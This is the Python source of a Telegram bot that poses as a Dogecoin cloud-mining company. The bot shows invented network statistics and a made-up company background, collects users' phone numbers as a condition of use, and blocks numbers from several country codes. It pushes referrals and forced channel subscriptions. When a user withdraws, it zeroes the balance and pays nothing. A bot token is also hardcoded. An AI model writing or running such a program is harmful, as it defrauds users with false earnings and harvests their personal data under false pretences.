from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import sqlite3
import time
import random
import re
import traceback

# ================= الإعدادات الأساسية =================
TOKEN = "8960593021:AAFkF-8Cvt_jsOHJmNUyBGWMvzmE0hIbMbk"
OWNER_ID = 6610111288
BOT_USERNAME = "Dogcoinibot"
DB_PATH = "/tmp/doge_final_v1.db"
MIN_WITHDRAW = 0.01

# ================= قاموس اللغات الآمن =================
LANG = {
    'ar': {
        'btn_refresh': "🔄 تحديث الأرباح",
        'btn_withdraw': "💸 سحب الرصيد",
        'btn_team': "👥 فريقك (+30%)",
        'btn_tasks': "🔗 المهام المربحة",
        'btn_about': "🏢 عن الشركة",
        'btn_stats': "📊 إحصائيات المنجم",
        'btn_calc': "🧮 حاسبة الأرباح",
        'btn_support': "📞 الدعم الفني",
        'btn_lang': "🌐 English",
        'btn_admin': "👑 الإدارة (للمشرفين)",
        'phone_btn': "📱 مشاركة جهة الاتصال (إجباري)",
        'captcha_msg': "🤖 <b>نظام الحماية (Anti-Bot):</b>\n\nاضغط على الرمز المختلف (🔴) للبدء في جمع Dogecoin.",
        'captcha_ok': "تم التحقق البشري بنجاح! مرحباً بك في المنجم.",
        'captcha_fail': "❌ فشل التحقق الأمني! حاول مجدداً.",
        'phone_req': "🔒 <b>خطوة أمنية أخيرة:</b>\n\nلضمان عدم استخدام حسابات وهمية، يرجى مشاركة رقم هاتفك للتوثيق.",
        'phone_err': "❌ عذراً، الأرقام من هذه المنطقة الجغرافية غير مدعومة حالياً.",
        'sub_req': "⚠️ <b>تنبيه أمني!</b>\n\nيجب عليك الاشتراك في قنوات الشركة الرسمية لتفعيل حسابك.",
        'main_menu': "⛏ <b>خوادم التعدين النشطة</b>\n\n💰 الرصيد المباشر: <code>{balance:.8f}</code> <b>DOGE</b>\n⚡ قوة التعدين: <code>{speed:.8f}</code> DOGE/يوم\n👥 أعضاء الفريق: <code>{refs}</code>\n\n<i>🟢 حالة الخادم: متصل ومستقر.</i>",
        'team_msg': "👥 <b>برنامج الشركاء (Referral):</b>\n\nكل عضو تدعوه يزيد سرعة تعدينك بنسبة <b>30%</b> فور إكماله الكابتشا.\n\n📊 فريقك: <code>{refs}</code> عضو\n🔗 رابط الدعوة الخاص بك:\n<code>{link}</code>",
        'withdraw_err': "❌ رصيدك الحالي أقل من الحد الأدنى للسحب ({min} DOGE).",
        'withdraw_req': "💸 <b>بوابة السحب الآمنة:</b>\nأرسل الآن عنوان محفظة <b>Dogecoin (FaucetPay)</b> الخاصة بك لجدولة الدفعة:",
        'withdraw_done': "✅ <b>تم استلام طلب السحب!</b>\nالطلب قيد المراجعة المالية، ستصلك الدفعة قريباً.",
        'ref_notify': "🎉 <b>أخبار ممتازة!</b>\nسجل عضو جديد عبر رابطك وتجاوز الكابتشا. تمت زيادة سرعة تعدينك بنسبة 30%!",
        'task_msg': "🔗 <b>المهام الإعلانية:</b>\nاضغط على المهمة، تخطى الإعلانات، ثم انسخ الرمز السري وأرسله هنا:",
        'task_ok': "🎉 <b>عملية ناجحة!</b> تمت إضافة {reward:.8f} DOGE لحسابك.",
        'task_err': "❌ <b>رمز التحقق غير صحيح!</b> حاول مجدداً.",
        'about_text': "🏢 <b>عن شركة DogeCore Solutions:</b>\n\nنحن شركة رائدة في التعدين السحابي المؤسسي، يقع مقرنا الرئيسي في <b>وارسو، بولندا</b>. نعتمد على مناخ أوروبا الشرقية لتبريد مزارع خوادم الـ (ASIC)، مما يقلل تكاليف التشغيل ويسمح لنا بتقديم عوائد يومية مجانية للمستخدمين حول العالم.",
        'stats_text': "📊 <b>إحصائيات الشبكة المباشرة:</b>\n\n👤 إجمالي عمال التعدين: <code>1,452,890+</code>\n⚡ قوة الهاش: <code>45.2 TH/s</code>\n💸 إجمالي سحوبات اليوم: <code>12,450 DOGE</code>\n🟢 وقت التشغيل: <code>99.98%</code>",
        'calc_text': "🧮 <b>حاسبة الأرباح:</b>\n\n10 دعوات = زيادة 300% في سرعة التعدين!\n50 دعوة = دخل يومي مستقر ومستمر.",
        'support_text': "📞 <b>مركز خدمة العملاء:</b>\n\nنظراً للضغط المرتفع، يستغرق الرد من فريق الدعم من 24 إلى 48 ساعة.",
        'admin_panel': "👑 <b>مركز القيادة (المالك والمشرفين):</b>\nاختر العملية المطلوبة:",
    },
    'en': {
        'btn_refresh': "🔄 Refresh Data",
        'btn_withdraw': "💸 Withdraw Funds",
        'btn_team': "👥 Your Team",
        'btn_tasks': "🔗 Tasks & Rewards",
        'btn_about': "🏢 About Us",
        'btn_stats': "📊 Network Stats",
        'btn_calc': "🧮 Profit Calculator",
        'btn_support': "📞 Support",
        'btn_lang': "🌐 العربية",
        'btn_admin': "👑 Admin Panel",
        'phone_btn': "📱 Share Contact (Required)",
        'captcha_msg': "🤖 <b>Anti-Bot System:</b>\n\nClick the unique symbol (🔴) to authenticate.",
        'captcha_ok': "Human verification successful! Welcome to the mine.",
        'captcha_fail': "❌ Verification failed! Please try again.",
        'phone_req': "🔒 <b>Security Check:</b>\n\nPlease share your phone number to verify your identity.",
        'phone_err': "❌ Registration from your region is currently disabled.",
        'sub_req': "⚠️ <b>Action Required!</b>\n\nYou must join our official channels to activate your miner.",
        'main_menu': "⛏ <b>Active Mining Servers</b>\n\n💰 Live Balance: <code>{balance:.8f}</code> <b>DOGE</b>\n⚡ Hash Power: <code>{speed:.8f}</code> DOGE/Day\n👥 Team Size: <code>{refs}</code>\n\n<i>🟢 Server Status: Online & Stable.</i>",
        'team_msg': "👥 <b>Partner Program:</b>\n\nEarn a <b>30%</b> mining speed boost for every verified referral.\n\n📊 Team Members: <code>{refs}</code>\n🔗 Your Referral Link:\n<code>{link}</code>",
        'withdraw_err': "❌ Balance is below the minimum threshold ({min} DOGE).",
        'withdraw_req': "💸 <b>Secure Withdrawal:</b>\nSend your <b>Dogecoin (FaucetPay)</b> wallet address:",
        'withdraw_done': "✅ <b>Request Logged!</b>\nYour payout is under review.",
        'ref_notify': "🎉 <b>Great News!</b>\nA new user joined via your link. Speed increased by 30%!",
        'task_msg': "🔗 <b>Advertising Tasks:</b>\nComplete the link to find the code, then send it here:",
        'task_ok': "🎉 <b>Success!</b> {reward:.8f} DOGE added.",
        'task_err': "❌ <b>Invalid Code!</b> Try again.",
        'about_text': "🏢 <b>About DogeCore Solutions:</b>\n\nBased in <b>Warsaw, Poland</b>, we provide enterprise cloud mining solutions powered by cold-climate ASIC server facilities.",
        'stats_text': "📊 <b>Live Network Stats:</b>\n\n👤 Total Miners: <code>1,452,890+</code>\n⚡ Hashrate: <code>45.2 TH/s</code>\n💸 Paid Today: <code>12,450 DOGE</code>\n🟢 Uptime: <code>99.98%</code>",
        'calc_text': "🧮 <b>Profit Calculator:</b>\n\n10 Invites = 300% Speed Boost!\n50 Invites = Passive daily earnings.",
        'support_text': "📞 <b>Customer Support:</b>\n\nResponse time is currently 24-48 hours.",
        'admin_panel': "👑 <b>Command Center:</b>\nSelect an administrative action:",
    }
}

# ================= الدوال الأساسية المستقلة =================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY, phone TEXT, balance REAL DEFAULT 0.0,
                    speed REAL DEFAULT 0.0000000115, last_update INTEGER,
                    captcha_time INTEGER DEFAULT 0, referrer_id INTEGER DEFAULT 0,
                    ref_count INTEGER DEFAULT 0, state TEXT DEFAULT 'idle', lang TEXT DEFAULT 'ar')''')
    c.execute('''CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)''')
    c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (OWNER_ID,))
    c.execute('''CREATE TABLE IF NOT EXISTS channels (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, ch_id TEXT, type TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS shortlinks (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, password TEXT, reward REAL)''')
    conn.commit()
    conn.close()

def call_api(method, payload):
    api_url = f"https://api.telegram.org/bot{TOKEN}/{method}"
    req = urllib.request.Request(api_url, data=json.dumps(payload).encode('utf-8'), headers={'Content-Type': 'application/json'})
    try:
        res = urllib.request.urlopen(req, timeout=5)
        return json.loads(res.read().decode('utf-8'))
    except Exception:
        return None

def send_msg(chat_id, text, markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    if markup:
        payload["reply_markup"] = markup
    return call_api("sendMessage", payload)

def delete_msg(chat_id, msg_id):
    return call_api("deleteMessage", {"chat_id": chat_id, "message_id": msg_id})

def check_sub(user_id, channel_id):
    res = call_api("getChatMember", {"chat_id": channel_id, "user_id": user_id})
    if res and res.get('ok'):
        return res['result']['status'] in ['member', 'administrator', 'creator']
    return False

def get_text(lang, key, **kwargs):
    text = LANG.get(lang, LANG['ar']).get(key, "")
    if kwargs:
        text = text.format(**kwargs)
    return text

def get_reply_keyboard(lang, is_admin):
    kb = [
        [{"text": get_text(lang, 'btn_refresh')}],
        [{"text": get_text(lang, 'btn_withdraw')}, {"text": get_text(lang, 'btn_team')}],
        [{"text": get_text(lang, 'btn_tasks')}, {"text": get_text(lang, 'btn_calc')}],
        [{"text": get_text(lang, 'btn_stats')}, {"text": get_text(lang, 'btn_about')}],
        [{"text": get_text(lang, 'btn_support')}, {"text": get_text(lang, 'btn_lang')}]
    ]
    if is_admin:
        kb.insert(0, [{"text": get_text(lang, 'btn_admin')}])
    return {"keyboard": kb, "resize_keyboard": True}

def send_captcha(chat_id, lang):
    btns = [{"text": "🔹", "callback_data": "cap_fail"} for _ in range(3)]
    btns.insert(random.randint(0, 3), {"text": "🔴", "callback_data": "cap_ok"})
    send_msg(chat_id, get_text(lang, 'captcha_msg'), {"inline_keyboard": [btns]})

def update_mining(user_id, cursor, conn):
    try:
        now = int(time.time())
        cursor.execute("SELECT balance, speed, last_update FROM users WHERE user_id = ?", (user_id,))
        row = cursor.fetchone()
        if row:
            bal = float(row[0] or 0.0)
            speed = float(row[1] or 0.0000000115)
            last = int(row[2]) if row[2] else now
            earned = (now - last) * speed
            cursor.execute("UPDATE users SET balance = ?, last_update = ? WHERE user_id = ?", (bal + earned, now, user_id))
            conn.commit()
    except Exception:
        pass

def send_main_menu(chat_id, user_id, cursor, conn, lang):
    update_mining(user_id, cursor, conn)
    cursor.execute("SELECT balance, speed, ref_count FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    bal = float(row[0] or 0.0)
    speed = float(row[1] or 0.0000000115)
    refs = int(row[2] or 0)
    text = get_text(lang, 'main_menu', balance=bal, speed=speed*86400, refs=refs)
    send_msg(chat_id, text)

def send_admin_panel(chat_id, lang):
    btns = [
        [{"text": "💰 زيادة رصيد مستخدم", "callback_data": "admin_add_bal"}],
        [{"text": "📢 إذاعة للجميع", "callback_data": "admin_broadcast"}],
        [{"text": "➕ إضافة قناة إجبارية", "callback_data": "add_main_ch"}],
        [{"text": "🔗 إضافة رابط وكلمة سر", "callback_data": "add_shortlink"}],
        [{"text": "👑 إضافة مشرف فرعي", "callback_data": "admin_add_admin"}]
    ]
    send_msg(chat_id, get_text(lang, 'admin_panel'), {"inline_keyboard": btns})

# ================= معالجة الرسائل =================
def process_message(msg):
    chat_id = msg['chat']['id']
    user_id = msg['from']['id']
    text = msg.get('text', '')

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    is_admin = c.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,)).fetchone() is not None

    c.execute("SELECT phone, captcha_time, state, balance, lang, referrer_id FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    now = int(time.time())

    if not user:
        ref_id = 0
        if text.startswith("/start ") and text.split(" ")[1].isdigit():
            ref_id = int(text.split(" ")[1])
        c.execute("INSERT INTO users (user_id, last_update, referrer_id) VALUES (?, ?, ?)", (user_id, now, ref_id))
        conn.commit()
        user = (None, 0, 'idle', 0.0, 'ar', ref_id)

    phone, captcha_time, state, balance, lang, ref_id = user
    bal_float = float(balance or 0.0)

    # 1. التحقق من الرقم
    if not phone:
        if 'contact' in msg:
            p = msg['contact'].get('phone_number', '')
            if not p.startswith('+'):
                p = '+' + p
            if re.match(r'^\+(1|3|4|61)', p) and not p.startswith('+7'):
                send_msg(chat_id, get_text(lang, 'phone_err'), {"remove_keyboard": True})
                conn.close()
                return
            c.execute("UPDATE users SET phone = ? WHERE user_id = ?", (p, user_id))
            conn.commit()
            send_msg(chat_id, "✅", {"remove_keyboard": True})
            send_captcha(chat_id, lang)
        else:
            markup = {"keyboard": [[{"text": get_text(lang, 'phone_btn'), "request_contact": True}]], "resize_keyboard": True}
            send_msg(chat_id, get_text(lang, 'phone_req'), markup)
        conn.close()
        return

    # 2. فحص الكابتشا الدوري
    if now - captcha_time > 3600:
        send_captcha(chat_id, lang)
        conn.close()
        return

    # 3. القنوات الإجبارية
    c.execute("SELECT url, ch_id FROM channels WHERE type = 'main'")
    for ch_url, ch_id in c.fetchall():
        if not check_sub(user_id, ch_id):
            markup = {"inline_keyboard": [[{"text": "📢 Join / اشترك", "url": ch_url}], [{"text": "✅ Check / تحقق", "callback_data": "check_main_sub"}]]}
            send_msg(chat_id, get_text(lang, 'sub_req'), markup)
            conn.close()
            return

    # 4. أزرار الكيبورد السفلي
    if text == get_text(lang, 'btn_refresh'):
        send_main_menu(chat_id, user_id, c, conn, lang)
        conn.close()
        return

    elif text == get_text(lang, 'btn_lang'):
        new_lang = 'en' if lang == 'ar' else 'ar'
        c.execute("UPDATE users SET lang = ? WHERE user_id = ?", (new_lang, user_id))
        conn.commit()
        send_msg(chat_id, "🌐 تم تغيير اللغة / Language Updated", get_reply_keyboard(new_lang, is_admin))
        send_main_menu(chat_id, user_id, c, conn, new_lang)
        conn.close()
        return

    elif text == get_text(lang, 'btn_withdraw'):
        update_mining(user_id, c, conn)
        c.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        current_bal = float(c.fetchone()[0] or 0.0)
        if current_bal < MIN_WITHDRAW:
            send_msg(chat_id, get_text(lang, 'withdraw_err', min=MIN_WITHDRAW))
        else:
            c.execute("UPDATE users SET state = 'wait_wallet' WHERE user_id = ?", (user_id,))
            conn.commit()
            send_msg(chat_id, get_text(lang, 'withdraw_req'))
        conn.close()
        return

    elif text == get_text(lang, 'btn_team'):
        c.execute("SELECT ref_count FROM users WHERE user_id = ?", (user_id,))
        refs = int(c.fetchone()[0] or 0)
        link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
        send_msg(chat_id, get_text(lang, 'team_msg', refs=refs, link=link))
        conn.close()
        return

    elif text == get_text(lang, 'btn_tasks'):
        c.execute("SELECT id, reward FROM shortlinks")
        links = c.fetchall()
        if not links:
            send_msg(chat_id, "No tasks / لا توجد مهام حالياً")
        else:
            btns = [[{"text": f"🔗 Task (+{float(l[1] or 0.0):.8f})", "callback_data": f"do_link_{l[0]}"}] for l in links]
            send_msg(chat_id, get_text(lang, 'task_msg'), {"inline_keyboard": btns})
        conn.close()
        return

    elif text == get_text(lang, 'btn_about'):
        send_msg(chat_id, get_text(lang, 'about_text'))
        conn.close()
        return

    elif text == get_text(lang, 'btn_stats'):
        send_msg(chat_id, get_text(lang, 'stats_text'))
        conn.close()
        return

    elif text == get_text(lang, 'btn_calc'):
        send_msg(chat_id, get_text(lang, 'calc_text'))
        conn.close()
        return

    elif text == get_text(lang, 'btn_support'):
        send_msg(chat_id, get_text(lang, 'support_text'))
        conn.close()
        return

    elif text == get_text(lang, 'btn_admin') and is_admin:
        send_admin_panel(chat_id, lang)
        conn.close()
        return

    # 5. حالات الإدخال النصي
    system_btns = [get_text(lang, k) for k in ['btn_refresh', 'btn_withdraw', 'btn_team', 'btn_tasks', 'btn_lang', 'btn_about', 'btn_stats', 'btn_calc', 'btn_support', 'btn_admin']]

    if state == 'wait_wallet':
        if text in system_btns:
            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
            conn.commit()
            conn.close()
            return

        for admin in c.execute("SELECT user_id FROM admins").fetchall():
            send_msg(admin[0], f"🔔 <b>طلب سحب عاجل!</b>\n👤 آيدي: <code>{user_id}</code>\n💰 الرصيد: <code>{bal_float:.8f}</code> DOGE\n🏦 المحفظة:\n<code>{text}</code>")

        c.execute("UPDATE users SET balance = 0.0, state = 'idle' WHERE user_id = ?", (user_id,))
        conn.commit()
        send_msg(chat_id, get_text(lang, 'withdraw_done'))
        conn.close()
        return

    elif state.startswith('wait_pass_'):
        if text in system_btns:
            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
            conn.commit()
            conn.close()
            return

        link_id = int(state.split('_')[2])
        c.execute("SELECT password, reward FROM shortlinks WHERE id = ?", (link_id,))
        link = c.fetchone()
        if link and text.strip() == link[0]:
            c.execute("UPDATE users SET balance = balance + ?, state = 'idle' WHERE user_id = ?", (float(link[1] or 0.0), user_id))
            conn.commit()
            send_msg(chat_id, get_text(lang, 'task_ok', reward=float(link[1] or 0.0)))
        else:
            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
            conn.commit()
            send_msg(chat_id, get_text(lang, 'task_err'))
        conn.close()
        return

    elif state == 'admin_wait_bal_id' and is_admin:
        if text in system_btns:
            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
            conn.commit()
            conn.close()
            return
        try:
            target_id = int(text)
            c.execute("UPDATE users SET state = ? WHERE user_id = ?", (f'admin_wait_bal_amt_{target_id}', user_id))
            conn.commit()
            send_msg(chat_id, f"✅ تم تحديد المستخدم: <code>{target_id}</code>\nأرسل الآن المبلغ المراد إضافته:")
        except Exception:
            send_msg(chat_id, "❌ الآيدي غير صحيح.")
        conn.close()
        return

    elif state.startswith('admin_wait_bal_amt_') and is_admin:
        if text in system_btns:
            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
            conn.commit()
            conn.close()
            return
        target_id = int(state.split('_')[4])
        try:
            amount = float(text)
            c.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_id))
            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
            conn.commit()
            send_msg(chat_id, f"✅ تمت إضافة {amount:.8f} DOGE إلى المستخدم بنجاح.")
            send_msg(target_id, f"🎉 <b>إهداء من الإدارة!</b>\nتمت إضافة <code>{amount:.8f}</code> DOGE إلى رصيدك.")
        except Exception:
            send_msg(chat_id, "❌ المبلغ غير صحيح.")
        conn.close()
        return

    elif state == 'admin_wait_admin_id' and user_id == OWNER_ID:
        try:
            new_admin_id = int(text)
            c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (new_admin_id,))
            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
            conn.commit()
            send_msg(chat_id, f"✅ تم تعيين المستخدم <code>{new_admin_id}</code> كمشرف بنجاح.")
        except Exception:
            send_msg(chat_id, "❌ الآيدي غير صحيح.")
        conn.close()
        return

    # الأوامر
    if text == "/start":
        send_msg(chat_id, "✅", get_reply_keyboard(lang, is_admin))
        send_main_menu(chat_id, user_id, c, conn, lang)
    elif text == "/admin" and is_admin:
        send_admin_panel(chat_id, lang)

    conn.close()

# ================= معالجة نقرات الأزرار =================
def process_callback(cq):
    chat_id = cq['message']['chat']['id']
    user_id = cq['from']['id']
    data = cq.get('data', '')
    msg_id = cq['message']['message_id']
    cq_id = cq['id']

    call_api("answerCallbackQuery", {"callback_query_id": cq_id})

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT lang, referrer_id, captcha_time FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()

    if not row:
        c.execute("INSERT OR IGNORE INTO users (user_id, last_update) VALUES (?, ?)", (user_id, int(time.time())))
        conn.commit()
        row = ('ar', 0, 0)

    lang, ref_id, cap_time = row
    is_admin = c.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,)).fetchone() is not None

    if data == "cap_ok":
        now = int(time.time())
        if cap_time == 0 and ref_id and ref_id != 0:
            c.execute("UPDATE users SET speed = speed * 1.3, ref_count = ref_count + 1 WHERE user_id = ?", (ref_id,))
            ref_row = c.execute("SELECT lang FROM users WHERE user_id = ?", (ref_id,)).fetchone()
            if ref_row:
                send_msg(ref_id, get_text(ref_row[0], 'ref_notify'))

        c.execute("UPDATE users SET captcha_time = ? WHERE user_id = ?", (now, user_id))
        conn.commit()

        delete_msg(chat_id, msg_id)
        send_msg(chat_id, "✅ " + get_text(lang, 'captcha_ok'), get_reply_keyboard(lang, is_admin))
        send_main_menu(chat_id, user_id, c, conn, lang)

    elif data == "cap_fail":
        delete_msg(chat_id, msg_id)
        send_msg(chat_id, get_text(lang, 'captcha_fail'))
        send_captcha(chat_id, lang)

    elif data == "check_main_sub":
        send_main_menu(chat_id, user_id, c, conn, lang)

    elif data.startswith("do_link_"):
        link_id = int(data.split("_")[2])
        c.execute("UPDATE users SET state = ? WHERE user_id = ?", (f"wait_pass_{link_id}", user_id))
        conn.commit()
        send_msg(chat_id, "🔑 أرسل الرمز السري الآن هنا:")

    elif data == "admin_add_bal" and is_admin:
        c.execute("UPDATE users SET state = 'admin_wait_bal_id' WHERE user_id = ?", (user_id,))
        conn.commit()
        send_msg(chat_id, "💰 أرسل <b>الآيدي (ID)</b> الخاص بالمستخدم:")

    elif data == "admin_add_admin" and user_id == OWNER_ID:
        c.execute("UPDATE users SET state = 'admin_wait_admin_id' WHERE user_id = ?", (user_id,))
        conn.commit()
        send_msg(chat_id, "👑 أرسل <b>الآيدي (ID)</b> الخاص بالمشرف الجديد:")

    conn.close()

init_db()

# ================= ممر Vercel المباشر =================
class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            if body:
                data = json.loads(body.decode('utf-8'))
                if 'message' in data:
                    process_message(data['message'])
                elif 'callback_query' in data:
                    process_callback(data['callback_query'])
        except Exception:
            err = traceback.format_exc()
            try:
                send_msg(OWNER_ID, f"⚠️ <b>Crash Trace:</b>\n<code>{err[-600:]}</code>")
            except Exception:
                pass

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
        return

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Active")
        return
